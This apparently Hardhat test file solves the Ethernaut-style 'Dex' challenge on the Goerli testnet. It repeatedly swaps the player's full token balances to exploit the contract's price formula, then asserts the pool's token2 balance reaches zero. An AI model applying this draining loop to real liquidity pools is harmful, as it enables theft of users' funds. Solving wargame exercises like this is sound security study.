const { expect, assert } = require("chai");
const { ethers } = require("hardhat");
const { api_key, } = require('../secrets.json');

describe("Dex", function () {
	let contract, provider, first_account, another_account;
	let dex_address = false;

	beforeEach(async function () {
		dex_address = "0xe866574661467F4C2F361237A62a2a57b2b87C88";
		[first_account, another_account] = await ethers.getSigners();
		if (dex_address) {
			contract = await ethers.getContractAt("Dex", dex_address);
			provider = new ethers.providers.AlchemyProvider(network="goerli", api_key);
		} else {
			const Dex = await ethers.getContractFactory("Dex");
			contract = await Dex.deploy();
            await contract.deployed();
			dex_address = contract.address;

            const SwappableToken = await ethers.getContractFactory("SwappableToken");
			token1_contract = await SwappableToken.deploy(dex_address, "Token1", "TKN1", 110);
            token2_contract = await SwappableToken.deploy(dex_address, "Token2", "TKN2", 110);

            let tx = await contract.setTokens(token1_contract.address, token2_contract.address);
            await tx.wait();

            await contract.approve(dex_address, 100);
            tx = await contract.addLiquidity(token1_contract.address, 100);
            await tx.wait();
            tx = await contract.addLiquidity(token2_contract.address, 100);
            await tx.wait();
		}
		console.log("Contract address: ", dex_address);
	});

	it("Ataque", async function () {
        let token1Address = await contract.token1();
        let token2Address = await contract.token2();

        dexBalanceToken1 = await contract.balanceOf(token1Address, dex_address);
        console.log("Dex Token1 balance", dexBalanceToken1);
        dexBalanceToken2 = await contract.balanceOf(token2Address, dex_address);
        console.log("Dex Token2 balance", dexBalanceToken2);

        try {
            while (dexBalanceToken2 > 0 || dexBalanceToken1 > 0) {
                //obtain balance from token2, swap for token1
                playerBalanceToken2 = await contract.balanceOf(token2Address, first_account.address);
                console.log("Player Token2 balance", playerBalanceToken2);

                tx = await contract.approve(dex_address, playerBalanceToken2);
                await tx.wait();
                tx = await contract.swap(token2Address, token1Address, playerBalanceToken2);
                await tx.wait();

                // obtain balance from token1, swap for token2
                playerBalanceToken1 = await contract.balanceOf(token1Address, first_account.address);
                console.log("Player Token1 balance", playerBalanceToken1);
                tx = await contract.approve(dex_address, playerBalanceToken1);
                await tx.wait(); 
                tx = await contract.swap(token1Address, token2Address, playerBalanceToken1);
                await tx.wait();

                dexBalanceToken1 = await contract.balanceOf(token1Address, dex_address);
                console.log("Dex Token1 balance", dexBalanceToken1);
                dexBalanceToken2 = await contract.balanceOf(token2Address, dex_address);
                console.log("Dex Token2 balance", dexBalanceToken2);
            }
        } catch (e) {
            dexBalanceToken1 = await contract.balanceOf(token1Address, dex_address);
            dexBalanceToken2 = await contract.balanceOf(token2Address, dex_address);
            console.log("Dex balance token 1 & 2: ", dexBalanceToken1, dexBalanceToken2);
            console.log("Not enough to swap, trying now with dex balance", dexBalanceToken1);
            tx = await contract.approve(dex_address, dexBalanceToken1);
            await tx.wait(); 
            tx = await contract.swap(token1Address, token2Address, dexBalanceToken1);
            await tx.wait();
        }

        dexBalanceToken1 = await contract.balanceOf(token1Address, dex_address);
        console.log("Dex Token1 balance", dexBalanceToken1);
        dexBalanceToken2 = await contract.balanceOf(token2Address, dex_address);
        console.log("Dex Token2 balance", dexBalanceToken2);
        expect(dexBalanceToken2).to.equal(0);
	});

	afterEach(async function() {
		// COMPLETAR
	});
});
